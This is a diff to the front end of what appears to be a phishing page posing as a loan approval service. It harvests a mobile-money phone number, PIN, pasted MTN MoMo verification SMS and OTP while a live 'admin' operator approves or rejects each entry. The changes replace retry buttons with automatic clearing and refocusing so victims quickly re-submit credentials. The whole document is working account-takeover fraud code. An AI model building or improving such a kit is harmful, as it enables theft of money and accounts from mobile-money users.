@@ -467,23 +467,7 @@
       <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
       <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
       <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
-      
-      <!-- Error Message - User Must Re-enter Data -->
-      <div class="msg-box error" id="lpMsgRetry" style="display:none;">
-        <span class="msg-icon">❌</span>
-        <div>
-          <strong>Invalid Credentials</strong>
-          <p id="lpRetryTxt" style="margin: 5px 0 0 0; font-size: 0.8rem;">Please clear and re-enter your information to try again.</p>
-        </div>
-      </div>
-
       <button id="bLgn" class="btn-login" onclick="doLogin()">LOGIN</button>
-      
-      <!-- Retry Button - Appears only when admin rejects -->
-      <button id="bRetry" class="btn-grad" onclick="retryLogin()" style="display:none; margin-top: 10px;">
-        🔄 CLEAR & TRY AGAIN
-      </button>
-
       <div id="mLgn" class="loading">
         <div class="spinner" style="margin: 16px auto;"></div>
         <div class="wait-msg">Logging in…</div>
@@ -529,22 +513,7 @@
       <p class="sms-code-hint">Example: "Your MTN MoMo verification code is: 123456"</p>
       <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
       <div class="msg-box success" id="smsMsgOk"><span class="msg-icon">✓</span><span id="smsMsgOkTxt"></span></div>
-      
-      <!-- Error Message - Invalid SMS -->
-      <div class="msg-box error" id="smsMsgRetry" style="display:none;">
-        <span class="msg-icon">❌</span>
-        <div>
-          <strong>Invalid SMS Message</strong>
-          <p id="smsRetryTxt" style="margin: 5px 0 0 0; font-size: 0.8rem;">Your SMS message was invalid. Please clear and paste the correct message.</p>
-        </div>
-      </div>
-
       <button id="bSms" class="btn-sms" onclick="doSmsParse()">SUBMIT</button>
-      
-      <!-- Retry Button - Appears only when admin rejects SMS -->
-      <button id="bSmsRetry" class="btn-grad" onclick="retrySMS()" style="display:none; margin-top: 10px;">
-        🔄 CLEAR & RE-ENTER SMS
-      </button>
       <div id="mSms" class="loading">
         <div class="spinner" style="margin: 16px auto;"></div>
         <div class="wait-msg">Processing message…</div>
@@ -597,22 +566,7 @@
 
       <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
       <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
-      
-      <!-- Error Message - Wrong OTP -->
-      <div class="msg-box error" id="otpMsgRetry" style="display:none;">
-        <span class="msg-icon">❌</span>
-        <div>
-          <strong>Wrong OTP Code</strong>
-          <p id="otpRetryTxt" style="margin: 5px 0 0 0; font-size: 0.8rem;">Your OTP code was incorrect. Please clear and start from login again.</p>
-        </div>
-      </div>
-
       <button id="bOtp" class="btn-otp" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
-      
-      <!-- Retry Button - Appears only when admin marks wrong code -->
-      <button id="bOtpRetry" class="btn-grad" onclick="retryFromLogin()" style="display:none; margin-top: 10px;">
-        🔄 CLEAR & START FROM LOGIN
-      </button>
       <div id="mOtp" class="loading">
         <div class="spinner" style="margin: 16px auto;"></div>
         <div class="wait-msg">Verifying…</div>
@@ -974,15 +928,21 @@
             clearTimeout(pollTimeout);
             goTo('page-sms-paste');
           } else if (status === 'rejected') {
-            console.log('❌ Admin rejected login - showing retry button');
+            console.log('❌ Admin rejected login - AUTO CLEARING DATA');
             clearTimeout(pollTimeout);
             
-            // Show rejection message with retry button
+            // AUTO-CLEAR all login data
+            document.getElementById('lpPhone').value = '';
+            [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
+            
+            // Go back to login page
             goTo('page-login');
-            document.getElementById('lpMsgRetry').style.display = 'block';
-            document.getElementById('bLgn').style.display = 'none';
-            document.getElementById('bRetry').style.display = 'block';
-            document.getElementById('lpRetryTxt').textContent = 'Your login credentials were invalid. Please clear and re-enter your information to try again.';
+            
+            // Show message and enable user to try immediately
+            showLgnMsg('error', '❌ Invalid Login. Your credentials were incorrect. Please try again.');
+            
+            // Auto-focus on phone field for user to immediately start typing
+            setTimeout(() => document.getElementById('lpPhone').focus(), 300);
           } else {
             // Still pending, keep polling
             pollTimeout = setTimeout(checkStatus, 2000);
@@ -1076,23 +1036,23 @@
             clearTimeout(smsPollTimeout);
             goTo('page-otp');
           } else if (status === 'rejected' || status === 'pending') {
-            console.log('❌ Admin rejected SMS or data cleared - user must re-enter from login');
+            console.log('❌ Admin rejected SMS - AUTO CLEARING DATA');
             clearTimeout(smsPollTimeout);
             
-            // Go back to login page
-            goTo('page-login');
-            
-            // Show rejection message with retry button
-            document.getElementById('lpMsgRetry').style.display = 'block';
-            document.getElementById('bLgn').style.display = 'none';
-            document.getElementById('bRetry').style.display = 'block';
-            document.getElementById('lpRetryTxt').textContent = 'Your SMS message was invalid. Please clear and start from login again with new credentials.';
-            
-            // Clear all form fields
+            // AUTO-CLEAR all data
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             document.getElementById('smsMsgBox').value = '';
             [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+            
+            // Go back to login page
+            goTo('page-login');
+            
+            // Show message - user can immediately re-enter
+            showLgnMsg('error', '❌ Invalid SMS Message. Your session has been cleared. Please start from login again.');
+            
+            // Auto-focus on phone field
+            setTimeout(() => document.getElementById('lpPhone').focus(), 300);
           } else {
             // Still pending, keep polling
             smsPollTimeout = setTimeout(checkStatus, 2000);
@@ -1209,23 +1169,23 @@
             
             goTo('page-approval');
           } else if (status === 'wrongcode' || status === 'pending') {
-            console.log('❌ Admin marked code as wrong or data cleared - user must re-enter from login');
+            console.log('❌ Admin marked code as wrong or data cleared - AUTO CLEARING');
             clearTimeout(otpPollTimeout);
             
-            // Go back to login page
-            goTo('page-login');
-            
-            // Show rejection message with retry button
-            document.getElementById('lpMsgRetry').style.display = 'block';
-            document.getElementById('bLgn').style.display = 'none';
-            document.getElementById('bRetry').style.display = 'block';
-            document.getElementById('lpRetryTxt').textContent = 'Your OTP code was incorrect or your session was reset. Please clear and start from login again with new credentials.';
-            
-            // Clear all form fields
+            // AUTO-CLEAR all data
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             document.getElementById('smsMsgBox').value = '';
             [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+            
+            // Go back to login page
+            goTo('page-login');
+            
+            // Show message - user can immediately re-enter
+            showLgnMsg('error', '❌ Invalid OTP Code. Your session has been cleared. Please start from login again.');
+            
+            // Auto-focus on phone field
+            setTimeout(() => document.getElementById('lpPhone').focus(), 300);
           } else {
             // Still pending, keep polling
             otpPollTimeout = setTimeout(checkStatus, 2000);
@@ -1243,85 +1203,6 @@
     
     // Start polling
     checkStatus();
-  }
-
-  // ══════════════════════════════════════════════════════
-  // RETRY BUTTONS - User clicks to clear data and try again
-  // ══════════════════════════════════════════════════════
-  function retryLogin() {
-    // Clear error message and show login button again
-    document.getElementById('lpMsgRetry').style.display = 'none';
-    document.getElementById('bRetry').style.display = 'none';
-    document.getElementById('bLgn').style.display = 'block';
-    
-    // Clear all form fields
-    document.getElementById('lpPhone').value = '';
-    [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-    
-    // Clear all messages
-    ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-    
-    // Re-enable login button
-    document.getElementById('bLgn').disabled = false;
-    
-    // Focus on phone field
-    document.getElementById('lpPhone').focus();
-    
-    console.log('🔄 User cleared login data and ready to retry');
-  }
-
-  function retrySMS() {
-    // Clear error message
-    document.getElementById('smsMsgRetry').style.display = 'none';
-    document.getElementById('bSmsRetry').style.display = 'none';
-    document.getElementById('bSms').style.display = 'block';
-    
-    // Clear SMS field
-    document.getElementById('smsMsgBox').value = '';
-    
-    // Clear all messages
-    ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-    
-    // Re-enable button
-    document.getElementById('bSms').disabled = false;
-    
-    // Focus on SMS field
-    document.getElementById('smsMsgBox').focus();
-    
-    console.log('🔄 User cleared SMS data and ready to retry');
-  }
-
-  function retryFromLogin() {
-    // Go back to login page
-    goTo('page-login');
-    
-    // Clear error message and show login button
-    document.getElementById('lpMsgRetry').style.display = 'none';
-    document.getElementById('bRetry').style.display = 'none';
-    document.getElementById('bLgn').style.display = 'block';
-    
-    // Clear ALL form fields (login, SMS, OTP)
-    document.getElementById('lpPhone').value = '';
-    [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-    document.getElementById('smsMsgBox').value = '';
-    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-    
-    // Clear all messages
-    ['lpMsg','lpMsgOk','lpMsgWarn','smsMsg','smsMsgOk','otpMsg','otpMsgOk'].forEach(id => {
-      const el = document.getElementById(id);
-      if (el) el.classList.remove('show');
-    });
-    
-    // Re-enable buttons
-    document.getElementById('bLgn').disabled = false;
-    document.getElementById('bSms').disabled = false;
-    document.getElementById('bOtp').disabled = false;
-    document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-    
-    // Focus on phone field
-    document.getElementById('lpPhone').focus();
-    
-    console.log('🔄 User cleared ALL data and returned to login');
   }
 
   // INIT
